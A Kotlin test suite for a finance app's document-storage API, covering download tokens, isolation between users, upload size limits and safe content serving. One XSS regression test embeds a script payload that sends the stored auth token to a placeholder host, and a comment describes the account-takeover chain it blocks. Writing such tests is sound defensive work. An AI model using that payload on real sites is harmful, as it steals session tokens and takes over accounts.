package com.jvillada.movi.server.routes

import com.auth0.jwt.JWT
import com.auth0.jwt.algorithms.Algorithm
import com.jvillada.movi.server.db.Accounts
import com.jvillada.movi.server.db.Budgets
import com.jvillada.movi.server.db.Credits
import com.jvillada.movi.server.db.Documents
import com.jvillada.movi.server.db.Events
import com.jvillada.movi.server.db.RecurringRules
import com.jvillada.movi.server.db.SmsMessages
import com.jvillada.movi.server.db.StatementImports
import com.jvillada.movi.server.db.Subscriptions
import com.jvillada.movi.server.db.Users
import com.jvillada.movi.server.db.VoidEvents
import com.jvillada.movi.server.plugins.configureRouting
import com.jvillada.movi.server.plugins.configureSerialization
import io.ktor.client.request.delete
import io.ktor.client.request.forms.MultiPartFormDataContent
import io.ktor.client.request.forms.formData
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.patch
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.Headers
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.server.application.Application
import io.ktor.server.auth.authentication
import io.ktor.server.auth.jwt.JWTPrincipal
import io.ktor.server.auth.jwt.jwt
import io.ktor.server.testing.ApplicationTestBuilder
import io.ktor.server.testing.testApplication
import org.jetbrains.exposed.sql.Database
import org.jetbrains.exposed.sql.SchemaUtils
import org.jetbrains.exposed.sql.insert
import org.jetbrains.exposed.sql.transactions.transaction
import java.util.Date
import kotlin.test.BeforeTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertTrue

/**
 * Las pruebas que le faltaban a la parte sensible de Documentos.
 *
 * La primera versión de esta feature se abrió a revisión **sin una sola prueba de servidor**: el
 * token de descarga, el aislamiento entre usuarios y el tope de tamaño se iban a mergear a
 * confianza. La revisión encontró ahí un XSS almacenado que era una toma de cuenta completa, y
 * un camino para tumbar el proceso. Estas pruebas fijan los dos arreglos.
 *
 * Mismo harness que el resto de `routes/`: H2 en memoria + JWT de prueba + `configureRouting()`.
 * El token de DESCARGA no usa el secreto de prueba: lo emite y lo verifica `JwtConfig`, así que
 * el circuito se prueba tal cual corre en producción.
 */
class DocumentRoutesTest {

    private val testSecret = "test-secret-for-document-routes-tests-min-32-chars"
    private val issuer = "movi"
    private val audience = "movi-client"

    private val duenoId = "user-dueno-documentos"
    private val otroId = "user-otro-documentos"

    private val cuentaDelDueno = "acc-dueno-doc"
    private val cuentaDelOtro = "acc-otro-doc"

    @BeforeTest
    fun setUp() {
        // El token de DESCARGA lo emite y lo verifica `JwtConfig`, no el secreto de prueba de
        // arriba, así que esta clase necesita que JwtConfig tenga uno. Sin esta línea dependía de
        // que otra clase del mismo fork lo hubiera fijado antes (`secret` es `by lazy`, se
        // resuelve una vez por JVM) o de que existiera un `server/.env` en el checkout: correr
        // solo esta clase la hacía fallar entera. Es la misma escotilla que usa `AuthRoutesTest`,
        // documentada en `JwtConfig` para exactamente esto.
        System.setProperty("movi.jwt.secret", "test-secret-for-document-routes-jwtconfig-32")

        Database.connect(
            url = "jdbc:h2:mem:document_routes_test;DB_CLOSE_DELAY=-1;MODE=PostgreSQL;DATABASE_TO_LOWER=TRUE",
            driver = "org.h2.Driver",
        )
        transaction {
            SchemaUtils.drop(
                Documents, Subscriptions, Credits, SmsMessages, RecurringRules, VoidEvents,
                Events, StatementImports, Budgets, Accounts, Users,
            )
            SchemaUtils.create(
                Users, Accounts, StatementImports, Events, VoidEvents, Budgets,
                RecurringRules, SmsMessages, Credits, Subscriptions, Documents,
            )
            listOf(duenoId to "dueno@doc.test", otroId to "otro@doc.test").forEach { (uid, mail) ->
                Users.insert {
                    it[id] = uid
                    it[email] = mail
                    it[name] = uid
                    it[passwordHash] = "hash"
                }
            }
            // Una cuenta de cada uno: los papeles se cuelgan de una cuenta, y la del otro es la
            // que la ruta tiene que rechazar.
            listOf(
                Triple(cuentaDelDueno, duenoId, "Bancolombia Ahorros"),
                Triple(cuentaDelOtro, otroId, "Cuenta ajena"),
            ).forEach { (cuenta, uid, nombre) ->
                Accounts.insert {
                    it[id] = cuenta
                    it[userId] = uid
                    it[name] = nombre
                    it[type] = "SAVINGS"
                    it[currency] = "COP"
                }
            }
        }
    }

    private fun tokenDeSesion(userId: String): String = JWT.create()
        .withIssuer(issuer)
        .withAudience(audience)
        .withClaim("userId", userId)
        .withClaim("email", "$userId@doc.test")
        .withExpiresAt(Date(System.currentTimeMillis() + 30L * 24 * 60 * 60 * 1000))
        .sign(Algorithm.HMAC256(testSecret))

    private fun Application.testModule() {
        configureSerialization()
        val verifier = JWT.require(Algorithm.HMAC256(testSecret))
            .withIssuer(issuer)
            .withAudience(audience)
            .build()
        authentication {
            jwt("jwt") {
                this.verifier(verifier)
                validate { c -> if (c.payload.getClaim("userId").asString() != null) JWTPrincipal(c.payload) else null }
            }
        }
        configureRouting()
    }

    private fun ApplicationTestBuilder.wireApp() = application { testModule() }

    private fun subida(nombre: String, contenido: ByteArray, mime: String) =
        MultiPartFormDataContent(
            formData {
                append("tipo", "EXTRACTO")
                append("file", contenido, Headers.build {
                    append(HttpHeaders.ContentDisposition, "filename=\"$nombre\"")
                    append(HttpHeaders.ContentType, mime)
                })
            },
        )

    /** Sube un documento y devuelve su id, sacado del JSON de respuesta. */
    private suspend fun ApplicationTestBuilder.subir(
        uid: String,
        nombre: String = "extracto.pdf",
        contenido: ByteArray = byteArrayOf(1, 2, 3, 4),
        mime: String = "application/pdf",
    ): String {
        val res = client.post("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
            setBody(subida(nombre, contenido, mime))
        }
        // El cuerpo se lee UNA vez: en `testApplication` es un canal de un solo uso, y pasarlo
        // como mensaje del assert lo consumía antes de que el regex lo mirara.
        val cuerpo = res.bodyAsText()
        assertEquals(HttpStatusCode.Created, res.status, cuerpo)
        return Regex("\"id\"\\s*:\\s*\"([^\"]+)\"").find(cuerpo)?.groupValues?.get(1)
            ?: error("respuesta sin id. status=${res.status} cuerpo=<$cuerpo>")
    }

    private suspend fun ApplicationTestBuilder.enlace(uid: String, docId: String): String {
        val res = client.post("/api/documents/$docId/link") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
        }
        val cuerpo = res.bodyAsText()
        assertEquals(HttpStatusCode.OK, res.status, cuerpo)
        return Regex("\"url\"\\s*:\\s*\"([^\"]+)\"").find(cuerpo)!!.groupValues[1]
    }

    // ── El camino feliz ────────────────────────────────────────────────────────

    @Test
    fun `sube, lista y abre su propio documento`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "Extracto agosto.pdf", contenido = byteArrayOf(9, 8, 7))

        val lista = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }
        assertEquals(HttpStatusCode.OK, lista.status)
        assertTrue("Extracto agosto.pdf" in lista.bodyAsText())

        val res = client.get(enlace(duenoId, id))
        assertEquals(HttpStatusCode.OK, res.status)
        assertEquals(listOf<Byte>(9, 8, 7), res.bodyAsText().toByteArray(Charsets.ISO_8859_1).toList())
    }

    @Test
    fun `la lista no trae los bytes`() = testApplication {
        // Con veinte extractos guardados, traerlos para pintar veinte renglones haría que abrir
        // la pantalla baje decenas de megas. El contenido es reconocible: 200 bytes de 0x41.
        wireApp()
        subir(duenoId, contenido = ByteArray(200) { 0x41 })

        val cuerpo = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText()

        assertFalse("AAAAAAAAAA" in cuerpo, "la lista no puede incluir el contenido del archivo")
        assertTrue("sizeBytes" !in cuerpo || "\"bytes\":200" in cuerpo)
    }

    // ── El token de descarga ───────────────────────────────────────────────────

    @Test
    fun `sin token no se abre`() = testApplication {
        wireApp()
        val id = subir(duenoId)
        assertEquals(HttpStatusCode.Unauthorized, client.get("/api/documents/$id/content").status)
    }

    @Test
    fun `el token de sesion NO sirve como enlace de descarga`() = testApplication {
        // Es el punto de todo el diseño: si sirviera, la URL que queda en el historial del
        // navegador y en los logs del proxy sería un JWT de 30 días con acceso a toda la cuenta.
        wireApp()
        val id = subir(duenoId)

        val res = client.get("/api/documents/$id/content?t=${tokenDeSesion(duenoId)}")

        assertEquals(HttpStatusCode.Unauthorized, res.status)
    }

    @Test
    fun `el enlace de un documento no abre otro`() = testApplication {
        wireApp()
        val a = subir(duenoId, nombre = "nomina.pdf")
        val b = subir(duenoId, nombre = "escritura.pdf")

        val tokenDeA = enlace(duenoId, a).substringAfter("t=")

        assertEquals(HttpStatusCode.Unauthorized, client.get("/api/documents/$b/content?t=$tokenDeA").status)
    }

    // ── Aislamiento entre usuarios ─────────────────────────────────────────────

    @Test
    fun `otro usuario no ve, no abre y no borra mi documento`() = testApplication {
        wireApp()
        val mio = subir(duenoId, nombre = "escritura Almendros.pdf")

        val suLista = client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }.bodyAsText()
        assertFalse("Almendros" in suLista)

        val suEnlace = client.post("/api/documents/$mio/link") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }
        assertEquals(HttpStatusCode.NotFound, suEnlace.status)

        val suBorrado = client.delete("/api/documents/$mio") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(otroId)}")
        }
        assertEquals(HttpStatusCode.NotFound, suBorrado.status)

        // Y sigue estando: el 404 no puede ser un borrado que además mintió.
        assertEquals(HttpStatusCode.OK, client.get(enlace(duenoId, mio)).status)
    }

    // ── El XSS que encontró la revisión ────────────────────────────────────────

    @Test
    fun `un html subido NO se sirve como html`() = testApplication {
        // La cadena que esto corta: el registro es público, así que un desconocido se registra,
        // sube `extracto.html` declarándolo text/html, pide su enlace y se lo manda al dueño por
        // WhatsApp. Si Movi lo sirviera `inline` con ese tipo, el script correría en el origen de
        // Movi —el mismo que guarda su JWT de 30 días en localStorage— y sería la cuenta entera.
        wireApp()
        val id = subir(
            duenoId,
            nombre = "extracto.html",
            contenido = "<script>fetch('//x/'+localStorage.auth_token)</script>".toByteArray(),
            mime = "text/html",
        )

        val res = client.get(enlace(duenoId, id))

        assertEquals(HttpStatusCode.OK, res.status)
        assertTrue(
            res.headers[HttpHeaders.ContentType]!!.startsWith("application/octet-stream"),
            "un tipo fuera de la lista blanca se sirve como binario opaco",
        )
        assertTrue(
            res.headers[HttpHeaders.ContentDisposition]!!.startsWith("attachment"),
            "y como adjunto, que es la forma de decir «esto no se renderiza acá»",
        )
        assertEquals("nosniff", res.headers["X-Content-Type-Options"])
    }

    @Test
    fun `un svg tampoco, aunque parezca una imagen`() = testApplication {
        // El caso que uno agregaría sin pensar a la lista blanca de imágenes: un SVG ejecuta
        // JavaScript.
        wireApp()
        val id = subir(duenoId, nombre = "logo.svg", contenido = "<svg/>".toByteArray(), mime = "image/svg+xml")

        val res = client.get(enlace(duenoId, id))

        assertTrue(res.headers[HttpHeaders.ContentType]!!.startsWith("application/octet-stream"))
        assertTrue(res.headers[HttpHeaders.ContentDisposition]!!.startsWith("attachment"))
    }

    @Test
    fun `un pdf si se muestra inline, que es para lo que existe la pantalla`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "extracto.pdf", mime = "application/pdf")

        val res = client.get(enlace(duenoId, id))

        assertTrue(res.headers[HttpHeaders.ContentType]!!.startsWith("application/pdf"))
        assertTrue(res.headers[HttpHeaders.ContentDisposition]!!.startsWith("inline"))
        assertEquals("nosniff", res.headers["X-Content-Type-Options"])
    }

    @Test
    fun `el nombre no puede romper el encabezado`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "ext\"racto.pdf")

        val disp = client.get(enlace(duenoId, id)).headers[HttpHeaders.ContentDisposition]

        assertNotNull(disp)
        assertFalse("ext\"racto" in disp, "la comilla se sanea antes de entrar al header")
    }

    // ── El tope de tamaño ──────────────────────────────────────────────────────

    @Test
    fun `un archivo que se pasa del tope se rechaza`() = testApplication {
        wireApp()
        val res = client.post("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            setBody(subida("gigante.pdf", ByteArray(11 * 1024 * 1024), "application/pdf"))
        }

        assertEquals(HttpStatusCode.PayloadTooLarge, res.status)
        // Y no quedó guardado a medias.
        assertFalse("gigante" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText())
    }

    // ── Corregir un documento ya subido ────────────────────────────────────────

    private suspend fun ApplicationTestBuilder.editar(uid: String, id: String, cuerpo: String) =
        client.patch("/api/documents/$id") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
            header(HttpHeaders.ContentType, "application/json")
            setBody(cuerpo)
        }

    @Test
    fun `lo que no viene en el cuerpo no se toca`() = testApplication {
        // La regla central de esta ruta. Si `null` borrara, corregir el NOMBRE de un documento le
        // borraría las notas de paso — el mismo defecto que costó un arreglo en
        // `PUT /api/credits/{id}`, donde un cliente viejo dejaba `paidBy` en NULL sin querer.
        wireApp()
        val id = subir(duenoId, nombre = "viejo.pdf")
        editar(duenoId, id, """{"periodo":"agosto 2026","notas":"del Bancolombia"}""")

        val res = editar(duenoId, id, """{"nombre":"nuevo.pdf"}""")
        val cuerpo = res.bodyAsText()

        assertEquals(HttpStatusCode.OK, res.status, cuerpo)
        assertTrue("nuevo.pdf" in cuerpo)
        assertTrue("agosto 2026" in cuerpo, "el período no se manda y por lo tanto no se toca")
        assertTrue("del Bancolombia" in cuerpo, "las notas tampoco")
    }

    @Test
    fun `la cadena vacia SI borra`() = testApplication {
        // La otra mitad, y es la que hace útil a la primera: sin esto, una nota escrita por error
        // no se podría sacar nunca.
        wireApp()
        val id = subir(duenoId)

        // La siembra se COMPRUEBA. La primera versión solo afirmaba en negativo —«la nota ya no
        // está»— así que una ruta que contestara 404 a todo, con cuerpo vacío, la habría pasado
        // igual. Un test que pasa cuando nada funciona no prueba nada.
        val sembrado = editar(duenoId, id, """{"notas":"me equivoqué"}""")
        val cuerpoSembrado = sembrado.bodyAsText()
        assertEquals(HttpStatusCode.OK, sembrado.status, cuerpoSembrado)
        assertTrue("me equivoqué" in cuerpoSembrado, "la nota tiene que estar antes de borrarla")

        val res = editar(duenoId, id, """{"notas":""}""")
        val cuerpo = res.bodyAsText()

        assertEquals(HttpStatusCode.OK, res.status, cuerpo)
        assertFalse("me equivoqué" in cuerpo)
    }

    @Test
    fun `corregir el tipo lo mueve de grupo`() = testApplication {
        // El caso que originó la ruta: un IMG_4821.jpg que es la escritura quedaba en «Otros»
        // para siempre porque el tipo se adivina por el nombre del archivo.
        wireApp()
        val id = subir(duenoId, nombre = "IMG_4821.jpg", mime = "image/jpeg")

        val cuerpo = editar(duenoId, id, """{"tipo":"CONTRATO"}""").bodyAsText()

        assertTrue("CONTRATO" in cuerpo)
    }

    @Test
    fun `otro usuario no puede corregir mi documento`() = testApplication {
        wireApp()
        val mio = subir(duenoId, nombre = "escritura.pdf")

        assertEquals(HttpStatusCode.NotFound, editar(otroId, mio, """{"nombre":"robado.pdf"}""").status)
        // Y sigue llamándose como se llamaba: el 404 no puede ser un cambio que además mintió.
        assertTrue("escritura.pdf" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText())
    }

    @Test
    fun `un nombre en blanco no borra el nombre`() = testApplication {
        // Un documento sin nombre sería una fila que no se puede reconocer. Acá el vacío NO borra,
        // a diferencia de período y notas — y la diferencia es que un archivo siempre se llama de
        // alguna manera.
        wireApp()
        val id = subir(duenoId, nombre = "extracto.pdf")

        val cuerpo = editar(duenoId, id, """{"nombre":"   "}""").bodyAsText()

        assertTrue("extracto.pdf" in cuerpo)
    }

    @Test
    fun `borrar el propio documento lo saca de la lista`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "para-borrar.pdf")

        assertEquals(
            HttpStatusCode.NoContent,
            client.delete("/api/documents/$id") {
                header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            }.status,
        )
        assertFalse("para-borrar" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText())
    }

    // ── De qué cuenta es este papel ────────────────────────────────────────────

    /**
     * **El campo existía y no lo llenaba nadie.**
     *
     * `Documento.accountId` está en el modelo desde el primer día, pero la pantalla de subida no lo
     * mandaba, el archivador de extractos tampoco y `EdicionDeDocumento` ni siquiera lo tenía: no
     * había **ninguna** forma de colgar un papel de una cuenta. El contexto del asistente agrupa
     * por cuenta, así que los 30 documentos del dueño caían todos bajo «Sin cuenta asociada» y
     * preguntarle «¿qué tienes guardado de la cuenta 2334?» devolvía el bloque entero sin
     * distinguir nada.
     */
    @Test
    fun `colgar un documento de una cuenta, cambiarla y descolgarlo`() = testApplication {
        wireApp()
        transaction {
            Accounts.insert {
                it[id] = "acc-dueno-tarjeta"
                it[userId] = duenoId
                it[name] = "Mastercard 3684"
                it[type] = "CREDIT_CARD"
                it[currency] = "COP"
            }
        }
        val id = subir(duenoId, nombre = "Extracto_2334_08_2026.pdf")

        val puesta = editar(duenoId, id, """{"accountId":"$cuentaDelDueno"}""")
        // El cuerpo se lee UNA vez: en `testApplication` es un canal de un solo uso.
        val cuerpoPuesta = puesta.bodyAsText()
        assertEquals(HttpStatusCode.OK, puesta.status, cuerpoPuesta)
        assertTrue(cuentaDelDueno in cuerpoPuesta, cuerpoPuesta)

        // Cambiarla: el papel era de la otra cuenta.
        val cuerpoCambiada = editar(duenoId, id, """{"accountId":"acc-dueno-tarjeta"}""").bodyAsText()
        assertTrue("acc-dueno-tarjeta" in cuerpoCambiada, cuerpoCambiada)

        // Y la cadena vacía la descuelga, igual que en período y notas: sin esto, una cuenta
        // puesta por error se quedaba puesta para siempre.
        val descolgada = editar(duenoId, id, """{"accountId":""}""")
        val cuerpo = descolgada.bodyAsText()
        assertEquals(HttpStatusCode.OK, descolgada.status, cuerpo)
        assertFalse("acc-dueno-tarjeta" in cuerpo, "la cadena vacía descuelga: $cuerpo")
    }

    @Test
    fun `mandar la cuenta de otro no cuelga nada`() = testApplication {
        // El `where` del UPDATE filtra por documento, no por cuenta: sin comprobarlo antes, el id
        // ajeno entraba tal cual a la columna y volvía en la respuesta.
        wireApp()
        val id = subir(duenoId, nombre = "escritura.pdf")

        val res = editar(duenoId, id, """{"accountId":"$cuentaDelOtro"}""")

        assertEquals(HttpStatusCode.BadRequest, res.status, res.bodyAsText())
        assertFalse(cuentaDelOtro in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText(), "el rechazo no puede ser un cambio que además mintió")
    }

    @Test
    fun `una cuenta que no existe tampoco se cuelga`() = testApplication {
        wireApp()
        val id = subir(duenoId)
        assertEquals(HttpStatusCode.BadRequest, editar(duenoId, id, """{"accountId":"acc-inventada"}""").status)
    }

    @Test
    fun `no mandar la cuenta no la borra`() = testApplication {
        // La regla central de la ruta, aplicada al campo nuevo: corregir el NOMBRE no puede
        // descolgar el papel de su cuenta de paso.
        wireApp()
        val id = subir(duenoId)
        assertEquals(HttpStatusCode.OK, editar(duenoId, id, """{"accountId":"$cuentaDelDueno"}""").status)

        val cuerpo = editar(duenoId, id, """{"nombre":"otro nombre.pdf"}""").bodyAsText()

        assertTrue(cuentaDelDueno in cuerpo, "la cuenta no se manda y por lo tanto no se toca: $cuerpo")
    }

    @Test
    fun `subir un documento a la cuenta de otro se rechaza`() = testApplication {
        // La misma puerta, del lado del POST: el multipart ya aceptaba un `accountId` y nadie lo
        // comprobaba, así que el papel nacía colgado de la cuenta ajena.
        wireApp()
        val res = client.post("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            setBody(
                MultiPartFormDataContent(
                    formData {
                        append("tipo", "EXTRACTO")
                        append("accountId", cuentaDelOtro)
                        append("file", byteArrayOf(1, 2, 3), Headers.build {
                            append(HttpHeaders.ContentDisposition, "filename=\"robado.pdf\"")
                            append(HttpHeaders.ContentType, "application/pdf")
                        })
                    },
                ),
            )
        }

        assertEquals(HttpStatusCode.BadRequest, res.status, res.bodyAsText())
        assertFalse("robado.pdf" in client.get("/api/documents") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
        }.bodyAsText(), "y no quedó guardado sin la cuenta tampoco")
    }

    // ── «Importar movimientos» sobre un documento ya guardado (Ola B, tarea 7) ─────────
    //
    // «Extractos» se une a Documentos: `POST /api/documents/{id}/leer-extracto` tiene que correr
    // EXACTAMENTE el mismo camino que `POST /api/statements/upload`, no una copia. Estas pruebas
    // no dependen de ANTHROPIC_API_KEY (no configurada en este entorno de pruebas, ver
    // `ClaudeStatementParser.resolveApiKey`): con la clave ausente, tanto subir como leer caen en
    // el mismo 422 `LECTURA_SIN_LLAVE`, que es justo el terreno común para probar el aislamiento
    // y la reutilización sin necesitar una lectura real de Claude.
    //
    // El nombre del documento en estas pruebas termina en `.txt` a propósito: `procesarExtracto`
    // elige cómo leer el archivo por la EXTENSIÓN del nombre guardado (ver
    // `StatementParser.extractText`), y un `.pdf` con bytes que no son un PDF de verdad hace
    // explotar PDFBox antes de llegar a la pregunta que estas pruebas quieren hacer.

    private suspend fun ApplicationTestBuilder.leerExtracto(uid: String, id: String) =
        client.post("/api/documents/$id/leer-extracto") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(uid)}")
        }

    @Test
    fun `el dueño puede leer el extracto de su propio documento`() = testApplication {
        wireApp()
        val id = subir(duenoId, nombre = "extracto.txt", contenido = "sin movimientos reconocibles".toByteArray(), mime = "text/plain")

        val res = leerExtracto(duenoId, id)
        val cuerpo = res.bodyAsText()

        // 422 y no 404 ni 500: encontró el documento, es SUYO, y llegó hasta el lector —que sin
        // clave de Anthropic no puede leer nada, y lo dice.
        assertEquals(HttpStatusCode.UnprocessableEntity, res.status, cuerpo)
        assertTrue("Tu archivo no tiene nada malo" in cuerpo, cuerpo)
    }

    @Test
    fun `leer el extracto de un documento inexistente da 404`() = testApplication {
        wireApp()
        assertEquals(HttpStatusCode.NotFound, leerExtracto(duenoId, "doc_no_existe").status)
    }

    @Test
    fun `otro usuario no puede leer el extracto de mi documento`() = testApplication {
        wireApp()
        val mio = subir(duenoId, nombre = "extracto.txt", mime = "text/plain")

        assertEquals(HttpStatusCode.NotFound, leerExtracto(otroId, mio).status)
    }

    @Test
    fun `leer el extracto de un documento ya guardado contesta exactamente lo mismo que subirlo`() = testApplication {
        // La prueba de que es EL MISMO camino y no una copia: los mismos bytes, por las dos
        // puertas, tienen que dar el mismo status y el mismo cuerpo.
        wireApp()
        val bytes = "sin movimientos reconocibles".toByteArray()
        val id = subir(duenoId, nombre = "extracto.txt", contenido = bytes, mime = "text/plain")

        val desdeElDocumento = leerExtracto(duenoId, id)
        val subiendoDeNuevo = client.post("/api/statements/upload") {
            header(HttpHeaders.Authorization, "Bearer ${tokenDeSesion(duenoId)}")
            setBody(
                MultiPartFormDataContent(
                    formData {
                        append("file", bytes, Headers.build {
                            append(HttpHeaders.ContentDisposition, "filename=\"extracto.txt\"")
                            append(HttpHeaders.ContentType, "text/plain")
                        })
                    },
                ),
            )
        }

        assertEquals(desdeElDocumento.status, subiendoDeNuevo.status)
        assertEquals(desdeElDocumento.bodyAsText(), subiendoDeNuevo.bodyAsText())
    }
}
